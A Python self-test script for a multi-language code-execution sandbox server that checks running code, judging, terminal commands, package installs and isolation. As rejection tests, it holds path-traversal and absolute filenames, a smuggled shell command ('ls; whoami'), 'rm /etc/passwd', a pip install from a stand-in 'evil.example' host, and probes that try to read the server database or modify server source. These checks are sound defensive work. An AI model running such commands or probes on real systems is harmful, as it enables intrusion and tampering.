"""
End-to-end self-test: boots the real server on a throwaway DB/data dir and drives
it over HTTP -- all five languages, the terminal, package installs, isolation.

    python3 selftest.py            # offline checks + real PyPI/npm/GitHub installs
    python3 selftest.py --offline  # skip the checks that need internet
"""
import http.server
import io
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import zipfile

OFFLINE = "--offline" in sys.argv
tmp = tempfile.mkdtemp(prefix="dracotest-")
os.chmod(tmp, 0o755)  # sandbox uids must be able to traverse down to their workspace
PORT = 18787
MAVEN_PORT = 18788
env = dict(os.environ, PORT=str(PORT), DRACOSKILL_DB_PATH=os.path.join(tmp, "t.db"),
           DRACOSKILL_DATA_DIR=os.path.join(tmp, "data"), DRACOSKILL_MAVEN_BASE=f"http://127.0.0.1:{MAVEN_PORT}/maven2")
here = os.path.dirname(os.path.abspath(__file__))
srv = subprocess.Popen([sys.executable, "server.py"], cwd=here, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# a tiny fake Maven Central, so the jar command is tested without reaching the internet
def make_jar():
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        z.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")
    return b.getvalue()
class Maven(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/maven2/com/acme/widget/1.0/widget-1.0.jar":
            body = make_jar(); self.send_response(200); self.end_headers(); self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass
mv = http.server.ThreadingHTTPServer(("127.0.0.1", MAVEN_PORT), Maven)
threading.Thread(target=mv.serve_forever, daemon=True).start()

BASE = f"http://127.0.0.1:{PORT}"
token = None
passed = failed = 0

def call(method, path, body=None, auth=True):
    req = urllib.request.Request(BASE + path, method=method, data=json.dumps(body).encode() if body is not None else None,
                                 headers={"Content-Type": "application/json", **({"X-Session-Token": token} if auth and token else {})})
    try:
        with urllib.request.urlopen(req, timeout=300) as r:
            return json.loads(r.read()), r.status
    except urllib.error.HTTPError as e:
        return json.loads(e.read()), e.code

def check(name, cond, detail=""):
    global passed, failed
    if cond: passed += 1; print(f"  PASS  {name}")
    else: failed += 1; print(f"  FAIL  {name}  {detail}")

def term(cmd, pid, cwd=""):
    r, _ = call("POST", "/terminal", {"command": cmd, "projectId": pid, "cwd": cwd})
    return r

try:
    for _ in range(50):
        try: urllib.request.urlopen(BASE + "/health", timeout=1); break
        except Exception: time.sleep(0.2)

    print("sandboxes")
    d, _ = call("GET", "/sandboxes")
    ids = {s["id"]: s for s in d["sandboxes"]}
    check("six sandboxes reported", set(ids) == {"python", "javascript", "java", "c", "cpp", "terminal"})
    check("all six available", all(s["available"] for s in ids.values()), str([k for k, v in ids.items() if not v["available"]]))

    print("anonymous /execute, every language")
    progs = {
        "python": "print('py', 1+1)",
        "javascript": "console.log('js', 1+1)",
        "java": 'public class Hi { public static void main(String[] a){ System.out.println("java " + (1+1)); } }',
        "c": '#include <stdio.h>\nint main(){printf("c %d\\n",1+1);return 0;}',
        "cpp": '#include <iostream>\nint main(){std::cout<<"cpp "<<1+1<<"\\n";}',
    }
    for lang, code in progs.items():
        r, st = call("POST", "/execute", {"language": lang, "code": code}, auth=False)
        check(f"{lang} runs", st == 200 and r["stdout"].strip().endswith("2") and r["exitCode"] == 0, str(r)[:200])

    print("accounts + multi-file project")
    r, _ = call("POST", "/auth/register", {"username": "tester", "password": "secret1"}, auth=False)
    token = r["token"]
    p, _ = call("POST", "/projects", {"name": "multi"})
    pid = p["id"]
    def add(name, content):
        r, st = call("POST", f"/projects/{pid}/files", {"action": "create", "filename": name, "content": content})
        return r, st
    add("util.h", "int add(int a,int b);\n")
    add("util.c", '#include "util.h"\nint add(int a,int b){return a+b;}\n')
    add("main.c", '#include <stdio.h>\n#include "util.h"\nint main(){printf("c-multi %d\\n",add(2,3));}\n')
    add("Main.java", 'public class Main { public static void main(String[] a){ System.out.println("java-multi " + Helper.twice(21)); } }')
    add("Helper.java", 'public class Helper { static int twice(int x){ return 2*x; } }')
    add("lib.hpp", "inline int sq(int x){return x*x;}\n")
    add("main.cpp", '#include <iostream>\n#include "lib.hpp"\nint main(){std::cout<<"cpp-multi "<<sq(7)<<"\\n";}\n')
    add("app.py", "import helper\nprint('py-multi', helper.f())\n")
    add("helper.py", "def f(): return 'ok'\n")
    r, st = add("../evil.txt", "x"); check("path traversal filename rejected", st == 400, str(r))
    r, st = add("/etc/passwd", "x"); check("absolute filename rejected", st == 400)
    for entry, want in [("main.c", "c-multi 5"), ("Main.java", "java-multi 42"), ("main.cpp", "cpp-multi 49"), ("app.py", "py-multi ok")]:
        r, st = call("POST", f"/projects/{pid}/run", {"entry": entry})
        check(f"project run {entry}", st == 200 and want in r.get("stdout", ""), str(r)[:300])

    print("compile errors / crashes")
    add("bad.c", "int main(){ oops }")
    r, _ = call("POST", f"/projects/{pid}/run", {"entry": "bad.c"})
    check("compile error flagged", r.get("compileError") is True and "error" in r["stderr"], str(r)[:200])

    print("judge in new languages")
    for lang, sol in [("java", 'import java.util.Scanner;\npublic class Main{public static void main(String[] a){Scanner s=new Scanner(System.in);System.out.println(s.nextLong()+s.nextLong());}}'),
                      ("c", '#include <stdio.h>\nint main(){long long a,b;scanf("%lld %lld",&a,&b);printf("%lld\\n",a+b);}'),
                      ("cpp", '#include <iostream>\nint main(){long long a,b;std::cin>>a>>b;std::cout<<a+b<<"\\n";}')]:
        r, _ = call("POST", "/submit", {"problemId": "sum-two", "language": lang, "code": sol})
        check(f"judge accepts {lang}", r.get("verdict") == "Accepted", str(r)[:200])
    r, _ = call("POST", "/submit", {"problemId": "sum-two", "language": "c", "code": "int main(){return"})
    check("judge: Compilation Error", r.get("verdict") == "Compilation Error", str(r)[:200])

    print("terminal: files + run")
    check("terminal requires login", call("POST", "/terminal", {"command": "ls"}, auth=False)[1] == 401)
    o = term("ls", pid)["output"]; check("ls shows project files", "main.c" in o and "app.py" in o, o)
    term("mkdir src", pid); term("echo hello > src/note.txt", pid)
    o = term("cat src/note.txt", pid)["output"]; check("echo > file + cat", o.strip() == "hello", o)
    c = term("cd src", pid)["cwd"]; check("cd tracks cwd", c == "src", c)
    o = term("ls", pid, "src")["output"]; check("ls in cwd", "note.txt" in o, o)
    check("cd can't escape project", "no such directory" in term("cd ../../..", pid, "src")["output"])
    check("shell metachar not interpreted", "command not found" in term("ls; whoami", pid)["output"] or "no such" in term("ls; whoami", pid)["output"])
    check("rm path outside rejected", term("rm /etc/passwd", pid)["exitCode"] != 0)
    r = term("gcc main.c util.c -o prog", pid); check("terminal gcc", r["exitCode"] == 0, r["output"])
    check("./prog", "c-multi 5" in term("./prog", pid)["output"])
    check("terminal run", "cpp-multi 49" in term("run main.cpp", pid)["output"])
    check("terminal python -c", term("python -c \"print(6*7)\"", pid)["output"].strip() == "42")
    check("python -m pip blocked", "pip install" in term("python -m pip install x", pid)["output"])

    print("isolation (what user code can reach)")
    code = ("import os,glob\nres=[]\n"
            "for p in %r:\n"
            "  try: open(p,'rb').read(1); res.append('READABLE:'+p)\n"
            "  except Exception as e: res.append('denied')\n"
            "print(res)\n") % [os.path.join(tmp, "t.db")]
    r, _ = call("POST", "/execute", {"language": "python", "code": code}, auth=False)
    d2, _ = call("GET", "/sandboxes")
    if d2["isolation"]["perUserUid"]:
        check("user code cannot read the SQLite DB", "denied" in r["stdout"] and "READABLE" not in r["stdout"], str(r))
        r, _ = call("POST", "/execute", {"language": "python", "code": "import os;print(os.getuid())"}, auth=False)
        r, _ = call("POST", "/execute", {"language": "python", "code": "try:\n  open(%r,'ab'); print('WROTE')\nexcept Exception: print('denied')" % os.path.join(here, "server.py")}, auth=False)
        check("user code cannot modify server source", r["stdout"].strip() == "denied", str(r))
    else:
        print("  SKIP  per-user uid isolation (server not running as root here)")
    r, _ = call("POST", "/execute", {"language": "python", "code": "import os;print(os.environ.get('DRACOSKILL_DB_PATH'))"}, auth=False)
    check("server env not inherited by user code", r["stdout"].strip() == "None", r["stdout"])

    print("packages: jar (mock Maven), quota-free paths")
    o = term("jar add com.acme:widget:1.0", pid); check("jar add (mock maven)", "added widget-1.0.jar" in o["output"], str(o))
    check("jar list", "widget-1.0.jar" in term("jar list", pid)["output"])
    check("jar bad coord rejected", term("jar add nonsense", pid)["exitCode"] != 0)
    check("jar 404 reported", term("jar add com.acme:nope:9", pid)["exitCode"] != 0)
    add("UseJar.java", 'public class UseJar { public static void main(String[] a) throws Exception { Class.forName("META-INF.x"); } }')
    check("pip URL spec refused", term("pip install https://evil.example/x.tar.gz", pid)["exitCode"] != 0)
    check("pip custom index refused", term("pip install --index-url http://x requests", pid)["exitCode"] != 0)
    check("npm git spec refused", term("npm install github:foo/bar", pid)["exitCode"] != 0)

    if not OFFLINE:
        print("packages: real PyPI / npm / GitHub")
        add("pre.py", "import importlib.util as u\nprint([m for m in ('pyfiglet','termcolor') if u.find_spec(m)])\n")
        r, _ = call("POST", f"/projects/{pid}/run", {"entry": "pre.py"}); check("precondition: test pkgs not preinstalled", r.get("stdout", "").strip() == "[]", r.get("stdout", ""))
        o = term("pip install pyfiglet", pid); check("pip install (project scope)", o["exitCode"] == 0 and "[project scope]" in o["output"], o["output"][-300:])
        add("usefig.py", "import pyfiglet\nprint('fig', pyfiglet.figlet_format('hi').strip() != '')\n")
        r, _ = call("POST", f"/projects/{pid}/run", {"entry": "usefig.py"}); check("python imports installed pkg", "fig True" in r.get("stdout", ""), str(r)[:300])
        o = term("pip install --account termcolor", pid); check("pip install --account", o["exitCode"] == 0 and "[account scope]" in o["output"], o["output"][-200:])
        add("usetc.py", "import termcolor\nprint('tc ok')\n")
        r, _ = call("POST", f"/projects/{pid}/run", {"entry": "usetc.py"}); check("account-scope pkg visible in project", "tc ok" in r.get("stdout", ""), str(r)[:300])
        p2, _ = call("POST", "/projects", {"name": "other"}); pid2 = p2["id"]
        call("POST", f"/projects/{pid2}/files", {"action": "create", "filename": "m.py", "content": "import termcolor\nprint('ok2')\ntry:\n  import pyfiglet\n  print('LEAK')\nexcept ImportError:\n  print('no-fig')\n"})
        r, _ = call("POST", f"/projects/{pid2}/run", {"entry": "m.py"})
        check("project scope isolated, account scope shared", "ok2" in r.get("stdout", "") and "no-fig" in r.get("stdout", ""), str(r)[:300])
        check("pip list", "pyfiglet" in term("pip list", pid)["output"].lower())
        o = term("pip uninstall pyfiglet", pid); check("pip uninstall", o["exitCode"] == 0, o["output"][-200:])
        r, _ = call("POST", f"/projects/{pid}/run", {"entry": "usefig.py"}); check("uninstalled pkg is gone", "ModuleNotFoundError" in r.get("stderr", ""), str(r)[:200])
        check("pip refuses to uninstall system pkg", term("pip uninstall pip", pid)["exitCode"] != 0)
        o = term("npm install left-pad", pid); check("npm install", o["exitCode"] == 0, o["output"][-300:])
        add("usenpm.js", "const lp=require('left-pad');console.log(JSON.stringify(lp('x',3)));\n")
        r, _ = call("POST", f"/projects/{pid}/run", {"entry": "usenpm.js"}); check("node requires installed pkg", '"  x"' in r.get("stdout", ""), str(r)[:300])
        check("npm list", "left-pad" in term("npm list", pid)["output"])
        o = term("clib add github:nothings/stb", pid); check("clib add github header lib", o["exitCode"] == 0, o["output"][-300:])
        add("usestb.c", '#include <stdio.h>\n#define STB_DS_IMPLEMENTATION\n#include "stb_ds.h"\nint main(){int*a=NULL;arrput(a,5);arrput(a,9);printf("stb %d\\n",(int)arrlen(a)+a[1]);return 0;}\n')
        r, _ = call("POST", f"/projects/{pid}/run", {"entry": "usestb.c"}); check("C uses header-only lib", "stb 11" in r.get("stdout", ""), str(r)[:400])
        lo = term("libs", pid)["output"]; check("libs summary", "left-pad" in lo and "termcolor" in lo and "stb" in lo and "widget-1.0.jar" in lo, lo)
finally:
    srv.terminate(); mv.shutdown()
    import shutil; shutil.rmtree(tmp, ignore_errors=True)

print(f"\n{passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
